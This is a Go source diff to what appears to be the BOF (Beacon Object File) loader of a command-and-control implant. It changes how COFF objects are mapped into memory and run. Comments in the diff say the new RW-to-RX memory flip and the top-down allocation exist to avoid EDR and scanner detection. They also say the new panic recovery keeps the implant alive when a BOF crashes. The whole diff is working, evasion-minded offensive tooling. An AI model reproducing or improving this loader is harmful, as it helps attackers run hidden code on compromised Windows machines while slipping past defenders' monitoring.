@@ -15,6 +15,10 @@ import (
 // COFF machine type for x64.
 const machineAMD64 = 0x8664
 
+// IMAGE_SCN_MEM_EXECUTE — section is executable. Set on .text and
+// flavours (.text$mn, .text.startup) emitted by mingw / MSVC.
+const imageScnMemExecute uint32 = 0x20000000
+
 // COFF relocation types for x64. Reference:
 // https://learn.microsoft.com/windows/win32/debug/pe-format#type-indicators
 const (
@@ -115,6 +119,12 @@ type BOF struct {
 	// kv backs BeaconAddValue / GetValue / RemoveValue. Lazily allocated
 	// on first call and reset between Execute invocations (see Execute).
 	kv *kvStore
+
+	// outputSnapshot pins the bytes BeaconGetOutputData returns to the
+	// BOF for the remainder of the BOF call. Used by host-side wrappers
+	// (No-Consolation PE loader) that re-read their accumulated output
+	// from within the same BOF invocation. Reset each Execute.
+	outputSnapshot []byte
 }
 
 // SetUserData configures the blob BeaconGetCustomUserData returns to the
@@ -302,8 +312,17 @@ func (b *BOF) Execute(args []byte) ([]byte, error) {
 	execMem, err := windows.VirtualAlloc(
 		0,
 		uintptr(totalLen),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
+		// MEM_TOP_DOWN places the allocation in high-address space —
+		// reduces collision with the host's heap + low-RVA scanner
+		// heuristics. Same posture as goffloader.
+		windows.MEM_COMMIT|windows.MEM_RESERVE|windows.MEM_TOP_DOWN,
+		// Initially PAGE_READWRITE — we need write access to apply
+		// relocations + populate the import table. Sections marked
+		// IMAGE_SCN_MEM_EXECUTE get flipped to PAGE_EXECUTE_READ in
+		// step 6.5, after relocations land. The default RWX posture
+		// was a known EDR-watcher tell; this RW→RX pattern matches
+		// goffloader and the canonical OtterHacker COFFLoader.
+		windows.PAGE_READWRITE,
 	)
 	if err != nil {
 		return nil, fmt.Errorf("executable memory allocation failed: %w", err)
@@ -342,6 +361,35 @@ func (b *BOF) Execute(args []byte) ([]byte, error) {
 		}
 	}
 
+	// 6.5. RW → RX flip for every section that carries
+	//      IMAGE_SCN_MEM_EXECUTE. .text is the canonical case; some
+	//      compilers emit `.text$mn` / `.text.startup` flavours that
+	//      also need execute. Non-exec sections (.rdata, .data, .bss,
+	//      .pdata, .xdata, import table) stay RW.
+	//
+	//      Note: VirtualProtect operates on page boundaries (4 KB),
+	//      so when two adjacent sections share a page the flip
+	//      spreads across both. In practice the BOF corpus packs
+	//      .text + .pdata + .xdata first (all read-only at runtime)
+	//      and the writable .data / .bss come last, so the shared-
+	//      page case lands cleanly. The MEM_TOP_DOWN allocation is
+	//      already page-aligned at its base.
+	for i, l := range laid {
+		sec := sections[l.idx-1]
+		if sec.Characteristics&imageScnMemExecute == 0 {
+			continue
+		}
+		var oldProtect uint32
+		if err := windows.VirtualProtect(
+			execMem+uintptr(l.offset),
+			uintptr(len(l.data)),
+			windows.PAGE_EXECUTE_READ,
+			&oldProtect,
+		); err != nil {
+			return nil, fmt.Errorf("VirtualProtect on section %d failed: %w", i, err)
+		}
+	}
+
 	// 7. Find entry point symbol within .text.
 	entryOffset, err := b.findSymbolOffset(hdr, textIdx)
 	if err != nil {
@@ -349,16 +397,25 @@ func (b *BOF) Execute(args []byte) ([]byte, error) {
 	}
 
 	// 8. Call entry function with BOF convention: go(char *data, int len).
+	//    Wrapped in a defer-recover: a busted BOF (memory fault, illegal
+	//    instruction, stack overflow) would otherwise propagate through
+	//    Go's signal handler and terminate the host process. The recover
+	//    captures the panic value into the per-BOF errors buffer so the
+	//    operator gets a diagnosable failure instead of an implant kill.
 	entryAddr := textBase + uintptr(entryOffset)
 	var argPtr, argLen uintptr
 	if len(args) > 0 {
 		argPtr = uintptr(unsafe.Pointer(&args[0]))
 		argLen = uintptr(len(args))
 	}
-	fn := func() {
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				b.errors.write([]byte(fmt.Sprintf("bof: panic during entry: %v\n", r)))
+			}
+		}()
 		syscallN(entryAddr, argPtr, argLen)
-	}
-	fn()
+	}()
 
 	return b.output.Bytes(), nil
 }
